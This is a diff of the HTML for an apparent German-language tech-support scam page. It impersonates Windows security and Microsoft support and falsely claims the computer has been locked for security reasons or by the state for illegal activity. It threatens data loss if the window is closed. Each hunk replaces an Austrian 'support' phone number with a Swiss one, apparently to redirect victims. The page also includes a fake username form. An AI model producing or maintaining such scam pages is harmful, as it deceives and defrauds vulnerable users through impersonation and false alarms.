@@ -330,7 +330,7 @@ wts.onload = function(){ wtsl7(2204567,1); };
             <div class="right-foot" style="text-align:center">
               <span id="footertxt">
                 <img src="JhPTQWjeygfO.png"> Windows-Sicherheit </span>
-              <span style="font-weight:500;padding-left:13px;color:#fff; ">Hilfezentrum :<span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">0043 1 395 065 7219
+              <span style="font-weight:500;padding-left:13px;color:#fff; ">Hilfezentrum :<span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">0041 44 505 5423
                 </span>
               </span>
             </div>
@@ -367,7 +367,7 @@ wts.onload = function(){ wtsl7(2204567,1); };
         </div>
         <img src="umTUFdyqpkTP.gif" id="banner">
         <div id="disclaimer" style="color:#0F396D;">Rufen Sie den Support an, um Hilfe zu erhalten<br>
-           <span class="Support" style="font-size:22px;">Windows-Unterstützung<span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">0043 1 395 065 7219
+           <span class="Support" style="font-size:22px;">Windows-Unterstützung<span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">0041 44 505 5423
             </span>
           </span>
         </div>
@@ -405,7 +405,7 @@ wts.onload = function(){ wtsl7(2204567,1); };
          <p>Rufen Sie sofort den Windows-Support an, um diese Bedrohung zu melden, Identitätsdiebstahl zu verhindern und den Zugriff auf dieses Gerät freizugeben. </p>
          <p>Das Schließen dieses Fensters kann Ihre persönlichen Daten gefährden und dazu führen, dass Ihre Windows-Registrierung gesperrt wird. </p>
          <p style="padding-bottom:0;color:#fff;font-size:16px">Windows Bitte rufen Sie den Support an:<strong>
-            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 0043 1 395 065 7219
+            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 0041 44 505 5423
             </span>
           </strong>
         </p>
@@ -418,7 +418,7 @@ wts.onload = function(){ wtsl7(2204567,1); };
       <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
         <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Der Zugriff auf dieses System wurde aus Sicherheitsgründen gesperrt. Greifen Sie nicht auf diesen PC zu und starten Sie ihn nicht neu. Wenn Sie diese grundlegende Warnung ignorieren, können Informationen zu diesem Framework verloren gehen. Wenden Sie sich so schnell wie möglich an den Support. Ein Microsoft-Experte wird Sie telefonisch durch die Untersuchung führen. Das Ausführen dieser Anwendung kann Ihren PC gefährden。<br>
           <strong>
-         Windows-Unterstützung: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    0043 1 395 065 7219
+         Windows-Unterstützung: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    0041 44 505 5423
             </span>
           </strong>
         </p>
@@ -464,7 +464,7 @@ document.addEventListener("DOMContentLoaded", function () {
         <br>
         <p>Technischer Support für Windows
         </p>
-        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    0043 1 395 065 7219
+        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    0041 44 505 5423
           <br>(Supportnummer)<br><br>
         </h4>
         <div class="arrow-down">
@@ -502,7 +502,7 @@ document.addEventListener("DOMContentLoaded", function () {
       <strong>Ihr Gerät wurde aufgrund illegaler Aktivitäten durch den Staat gesperrt <span id="state" style="color: red; font-size: 16px;"></span>
       </strong>
 
-       <br><strong>  Kontaktieren Sie den Microsoft Windows-Support : 0043 1 395 065 7219	</strong></p>
+       <br><strong>  Kontaktieren Sie den Microsoft Windows-Support : 0041 44 505 5423	</strong></p>
 
         <form action="#">
            <input type="text" name="name" id="name" placeholder="Benutzername" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>
